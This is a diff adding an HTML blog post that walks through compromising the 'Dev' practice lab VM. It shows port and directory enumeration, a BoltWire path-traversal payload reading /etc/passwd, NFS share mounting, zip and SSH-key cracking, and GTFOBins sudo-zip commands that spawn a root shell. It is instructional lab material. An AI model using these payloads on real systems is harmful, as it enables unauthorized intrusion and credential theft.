@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Dev Machine Walkthrough - NFS, LFI, and Privilege Escalation">
+    <title>Dev Machine Walkthrough | Muhammad Mughees</title>
+    <link rel="stylesheet" href="../../styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .walkthrough-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .walkthrough-header {
+            text-align: center;
+            margin-bottom: 3rem;
+            padding: 2rem;
+            background: linear-gradient(135deg, var(--secondary-color) 0%, #112240 100%);
+            border-radius: 10px;
+        }
+
+        .walkthrough-header h1 {
+            font-size: 2.5rem;
+            color: var(--primary-color);
+            margin-bottom: 1rem;
+        }
+
+        .walkthrough-section {
+            margin-bottom: 3rem;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 2rem;
+            border-radius: 10px;
+            border-left: 4px solid var(--primary-color);
+        }
+
+        .walkthrough-section h2 {
+            color: var(--primary-color);
+            margin-bottom: 1.5rem;
+            font-size: 2rem;
+        }
+
+        .walkthrough-section h3 {
+            color: var(--accent-color);
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            font-size: 1.5rem;
+        }
+
+        .walkthrough-section p {
+            line-height: 1.8;
+            margin-bottom: 1rem;
+            color: #8892b0;
+        }
+
+        .walkthrough-section code {
+            background: rgba(100, 255, 218, 0.1);
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            color: var(--accent-color);
+            font-family: 'Courier New', monospace;
+        }
+
+        .code-block-wrapper {
+            position: relative;
+            margin: 1.5rem 0;
+        }
+
+        .walkthrough-section pre {
+            background: #112240;
+            padding: 1.5rem;
+            padding-top: 2.5rem;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 0;
+            border: 1px solid var(--primary-color);
+        }
+
+        .walkthrough-section pre code {
+            background: none;
+            padding: 0;
+            color: var(--primary-color);
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--primary-color);
+            color: var(--secondary-color);
+            border: none;
+            padding: 0.4rem 0.8rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            z-index: 10;
+        }
+
+        .copy-btn:hover {
+            background: var(--accent-color);
+            transform: translateY(-2px);
+        }
+
+        .copy-btn:active {
+            transform: translateY(0);
+        }
+
+        .copy-btn.copied {
+            background: #4CAF50;
+        }
+
+        .walkthrough-image {
+            text-align: center;
+            margin: 2rem 0;
+        }
+
+        .walkthrough-image img {
+            max-width: 100%;
+            border-radius: 10px;
+            border: 2px solid var(--primary-color);
+            box-shadow: 0 10px 30px rgba(0, 255, 136, 0.2);
+        }
+
+        .back-to-blog {
+            display: inline-block;
+            padding: 1rem 2rem;
+            background: var(--primary-color);
+            color: var(--secondary-color);
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            margin-bottom: 2rem;
+        }
+
+        .back-to-blog:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
+        }
+
+        .info-box {
+            background: rgba(100, 255, 218, 0.1);
+            padding: 1.5rem;
+            border-radius: 8px;
+            border-left: 4px solid var(--accent-color);
+            margin: 1.5rem 0;
+        }
+
+        .warning-box {
+            background: rgba(255, 136, 0, 0.1);
+            padding: 1.5rem;
+            border-radius: 8px;
+            border-left: 4px solid #ff8800;
+            margin: 1.5rem 0;
+        }
+
+        ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        ul li {
+            padding-left: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: #8892b0;
+            position: relative;
+        }
+
+        ul li:before {
+            content: "▹";
+            position: absolute;
+            left: 0;
+            color: var(--primary-color);
+        }
+
+        @media (max-width: 768px) {
+            .walkthrough-container {
+                padding: 1rem;
+            }
+
+            .walkthrough-header h1 {
+                font-size: 2rem;
+            }
+
+            .walkthrough-section {
+                padding: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <button id="backToTop" class="back-to-top">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+
+    <div class="walkthrough-container">
+        <a href="../../blog.html" class="back-to-blog">
+            <i class="fas fa-arrow-left"></i> Back to Blog
+        </a>
+
+        <div class="walkthrough-header">
+            <h1>Dev Machine Walkthrough</h1>
+            <p style="color: var(--accent-color); font-size: 1.2rem;">NFS Enumeration, LFI Exploitation & Privilege Escalation</p>
+        </div>
+
+        <!-- Overview -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-info-circle"></i> Overview</h2>
+            <p>This walkthrough demonstrates a complete penetration test of the Dev machine, covering multiple attack vectors including directory enumeration, Local File Inclusion (LFI), NFS mounting, password cracking, and privilege escalation through sudo abuse.</p>
+            
+            <div class="info-box">
+                <strong>Target Machine:</strong> Dev<br>
+                <strong>IP Address:</strong> 10.0.2.155<br>
+                <strong>Difficulty:</strong> Medium<br>
+                <strong>Skills Required:</strong> Nmap, Directory Enumeration, LFI Exploitation, NFS, fcrackzip, SSH, Sudo Exploitation
+            </div>
+
+            <p><strong>VM Download:</strong> <a href="https://drive.google.com/drive/folders/1xJy4ozXaahXvjbgTeJVWyY-eUGIKgCj1" target="_blank" style="color: var(--primary-color);">VMs - Google Drive</a></p>
+        </div>
+
+        <!-- Setup -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-cog"></i> Initial Setup</h2>
+            
+            <h3>Dev Machine Configuration</h3>
+            <p>Login credentials for the Dev VM:</p>
+            <pre><code>Username: root
+Password: tcm</code></pre>
+
+            <p>After logging in, obtain an IP address:</p>
+            <pre><code>dhclient
+ip a</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image.png" alt="Dev IP Configuration">
+            </div>
+        </div>
+
+        <!-- Reconnaissance -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-search"></i> Reconnaissance</h2>
+            
+            <h3>Nmap Scan</h3>
+            <p>Start with an Nmap scan to identify open ports and services:</p>
+            <pre><code>nmap -sV -sC -p- 10.0.2.155</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 1.png" alt="Nmap Scan Results">
+            </div>
+
+            <h3>Discovered Services</h3>
+            <p>The scan revealed 5 open ports with the following notable services:</p>
+            <ul>
+                <li><strong>Port 22:</strong> SSH - OpenSSH</li>
+                <li><strong>Port 80:</strong> HTTP - Apache web server</li>
+                <li><strong>Port 111:</strong> RPCbind</li>
+                <li><strong>Port 2049:</strong> NFS (Network File System)</li>
+                <li><strong>Port 8080:</strong> HTTP - Alternative web service</li>
+            </ul>
+        </div>
+
+        <!-- Web Enumeration -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-globe"></i> Web Service Enumeration</h2>
+            
+            <h3>Port 80 Analysis</h3>
+            <p>Visiting http://10.0.2.155 shows a Bolt CMS installation error page.</p>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 2.png" alt="Port 80 Bolt Error">
+            </div>
+
+            <h3>Port 8080 Analysis</h3>
+            <p>Port 8080 hosts a PHP application. Let's enumerate both services using ffuf.</p>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 3.png" alt="Port 8080 PHP Page">
+            </div>
+
+            <h3>Directory Enumeration - Port 80</h3>
+            <pre><code>ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.0.2.155/FUZZ</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 4.png" alt="Port 80 Directories">
+            </div>
+
+            <h3>Directory Enumeration - Port 8080</h3>
+            <pre><code>ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.0.2.155:8080/FUZZ</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 5.png" alt="Port 8080 Directories">
+            </div>
+
+            <h3>Exposed Configuration Files</h3>
+            <p>Browsing to http://10.0.2.155/app/ reveals exposed files and directories, including a <code>config.yaml</code> file.</p>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 6.png" alt="Exposed App Directory">
+            </div>
+
+            <div class="info-box">
+                <strong>Important:</strong> The config.yaml file contains username and password credentials. Save these for later use.
+            </div>
+        </div>
+
+        <!-- LFI Exploitation -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-bug"></i> LFI Exploitation</h2>
+            
+            <h3>BoltWire Discovery</h3>
+            <p>On port 8080, the /dev directory reveals a BoltWire CMS panel at http://10.0.2.155:8080/dev/</p>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 7.png" alt="BoltWire Panel">
+            </div>
+
+            <p>After registering and logging in, search for "boltwire exploit" on Google.</p>
+
+            <h3>LFI Vulnerability</h3>
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 8.png" alt="BoltWire LFI Exploit">
+            </div>
+
+            <p>BoltWire is vulnerable to Local File Inclusion (LFI). Use the following payload in the search action parameter:</p>
+            <pre><code>&action=../../../../../../../etc/passwd</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 9.png" alt="LFI /etc/passwd">
+            </div>
+
+            <p>Successfully read /etc/passwd and identified user <code>jeanpaul</code>.</p>
+        </div>
+
+        <!-- NFS Enumeration -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-network-wired"></i> NFS Enumeration</h2>
+            
+            <h3>Checking NFS Shares</h3>
+            <p>Since port 2049 (NFS) is open, let's enumerate available shares:</p>
+            <pre><code>showmount -e 10.0.2.155</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 10.png" alt="NFS Showmount">
+            </div>
+
+            <h3>Mounting NFS Share</h3>
+            <p>Create a mount point and mount the /srv/nfs share:</p>
+            <pre><code>mkdir /mnt/dev
+mount -t nfs 10.0.2.155:/srv/nfs /mnt/dev
+cd /mnt/dev
+ls -la</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 11.png" alt="Mounted NFS Files">
+            </div>
+
+            <p>Found a <code>save.zip</code> file in the mounted directory.</p>
+        </div>
+
+        <!-- Password Cracking -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-key"></i> Password Cracking</h2>
+            
+            <h3>Cracking Zip File Password</h3>
+            <p>Attempting to unzip save.zip reveals it's password protected. Use fcrackzip to crack the password:</p>
+            <pre><code>fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u save.zip</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 12.png" alt="fcrackzip Results">
+            </div>
+
+            <div class="info-box">
+                <strong>Password Found:</strong> java101
+            </div>
+
+            <h3>Extracting Zip Contents</h3>
+            <pre><code>unzip save.zip
+Password: java101</code></pre>
+
+            <p>The zip file contains:</p>
+            <ul>
+                <li><code>todo.txt</code> - Mentions "jp" (likely jeanpaul)</li>
+                <li><code>id_rsa</code> - SSH private key for jeanpaul</li>
+            </ul>
+
+            <p>The pieces are connecting: LFI revealed jeanpaul user, config.yaml had credentials, and now we have his SSH key!</p>
+        </div>
+
+        <!-- SSH Access -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-terminal"></i> SSH Access</h2>
+            
+            <h3>Connecting via SSH</h3>
+            <p>Try connecting with the id_rsa key and config.yaml password:</p>
+            <pre><code>chmod 600 id_rsa
+ssh -i id_rsa jeanpaul@10.0.2.155</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 13.png" alt="SSH Login">
+            </div>
+
+            <p>Successfully logged in using the password from config.yaml!</p>
+
+            <div class="info-box">
+                <strong>Alternative:</strong> If the password doesn't work, you can crack the id_rsa passphrase using John the Ripper:
+                <pre><code>ssh2john id_rsa > id_rsa.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash</code></pre>
+            </div>
+        </div>
+
+        <!-- Privilege Escalation -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-arrow-up"></i> Privilege Escalation</h2>
+            
+            <h3>Checking Sudo Privileges</h3>
+            <p>Check what commands jeanpaul can run with sudo:</p>
+            <pre><code>sudo -l</code></pre>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 14.png" alt="Sudo -l Output">
+            </div>
+
+            <p>We can run <code>/usr/bin/zip</code> as root without a password. This is exploitable!</p>
+
+            <h3>GTFOBins - Zip Exploitation</h3>
+            <p>Search for "gtfobins zip" on Google or visit: <a href="https://gtfobins.github.io/gtfobins/zip/" target="_blank" style="color: var(--primary-color);">GTFOBins - zip</a></p>
+
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 15.png" alt="GTFOBins Zip">
+            </div>
+
+            <h3>Exploiting Sudo Zip</h3>
+            <p>Use the GTFOBins commands to spawn a root shell:</p>
+            <pre><code>TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'</code></pre>
+
+            <p>Or use the alternative command:</p>
+            <pre><code>sudo /usr/bin/zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"</code></pre>
+        </div>
+
+        <!-- Root Access -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-flag-checkered"></i> Root Access</h2>
+            
+            <div class="walkthrough-image">
+                <img src="ExportBlock-92b304ae-a0f2-451e-aa36-ac082a3aab29-Part-1/image 16.png" alt="Root Shell and Flag">
+            </div>
+
+            <p>Successfully obtained root shell!</p>
+
+            <pre><code>whoami
+# Output: root
+
+cd /root
+ls
+cat flag.txt</code></pre>
+
+            <div class="info-box">
+                <strong>Box Rooted Successfully! 🎉</strong>
+            </div>
+        </div>
+
+        <!-- Summary -->
+        <div class="walkthrough-section">
+            <h2><i class="fas fa-list-check"></i> Summary</h2>
+            
+            <h3>Attack Chain</h3>
+            <ul>
+                <li>Nmap scan revealed HTTP (80, 8080), NFS (2049), and SSH services</li>
+                <li>Directory enumeration discovered exposed config.yaml with credentials</li>
+                <li>Identified BoltWire CMS on port 8080</li>
+                <li>Exploited LFI vulnerability to read /etc/passwd and identify jeanpaul user</li>
+                <li>Enumerated NFS shares and mounted /srv/nfs</li>
+                <li>Found password-protected save.zip file in NFS share</li>
+                <li>Cracked zip password using fcrackzip (password: java101)</li>
+                <li>Extracted SSH private key (id_rsa) from zip file</li>
+                <li>SSH'd as jeanpaul using config.yaml password</li>
+                <li>Discovered sudo privileges for /usr/bin/zip</li>
+                <li>Exploited sudo zip using GTFOBins technique</li>
+                <li>Gained root shell and captured the flag</li>
+            </ul>
+
+            <h3>Key Lessons</h3>
+            <ul>
+                <li>Always enumerate all services, not just HTTP</li>
+                <li>NFS shares can contain sensitive files</li>
+                <li>Configuration files often expose credentials</li>
+                <li>LFI vulnerabilities can reveal usernames and system information</li>
+                <li>Password-protected archives can be cracked with proper tools</li>
+                <li>GTFOBins is essential for sudo privilege escalation</li>
+                <li>Any binary with sudo privileges can potentially be exploited</li>
+            </ul>
+
+            <h3>Tools Used</h3>
+            <ul>
+                <li><strong>Nmap</strong> - Port scanning and service detection</li>
+                <li><strong>ffuf</strong> - Directory enumeration</li>
+                <li><strong>showmount</strong> - NFS share enumeration</li>
+                <li><strong>mount</strong> - Mounting NFS filesystems</li>
+                <li><strong>fcrackzip</strong> - Zip password cracking</li>
+                <li><strong>ssh/ssh2john</strong> - SSH key handling and cracking</li>
+                <li><strong>GTFOBins</strong> - Privilege escalation reference</li>
+            </ul>
+
+            <div class="warning-box">
+                <strong>Disclaimer:</strong> This walkthrough is for educational purposes only. Always obtain proper authorization before performing penetration testing on any system.
+            </div>
+        </div>
+
+        <a href="../../blog.html" class="back-to-blog">
+            <i class="fas fa-arrow-left"></i> Back to Blog
+        </a>
+    </div>
+
+    <script src="../../script.js"></script>
+    <script>
+        // Wrap all pre elements with copy button
+        document.addEventListener('DOMContentLoaded', function() {
+            const preElements = document.querySelectorAll('.walkthrough-section pre');
+            
+            preElements.forEach(pre => {
+                // Create wrapper
+                const wrapper = document.createElement('div');
+                wrapper.className = 'code-block-wrapper';
+                
+                // Create copy button
+                const copyBtn = document.createElement('button');
+                copyBtn.className = 'copy-btn';
+                copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy';
+                
+                // Insert wrapper before pre
+                pre.parentNode.insertBefore(wrapper, pre);
+                
+                // Move pre into wrapper and add button
+                wrapper.appendChild(copyBtn);
+                wrapper.appendChild(pre);
+                
+                // Copy functionality
+                copyBtn.addEventListener('click', function() {
+                    const code = pre.querySelector('code').textContent;
+                    navigator.clipboard.writeText(code).then(() => {
+                        copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+                        copyBtn.classList.add('copied');
+                        
+                        setTimeout(() => {
+                            copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy';
+                            copyBtn.classList.remove('copied');
+                        }, 2000);
+                    });
+                });
+            });
+        });
+    </script>
+</body>
+</html>
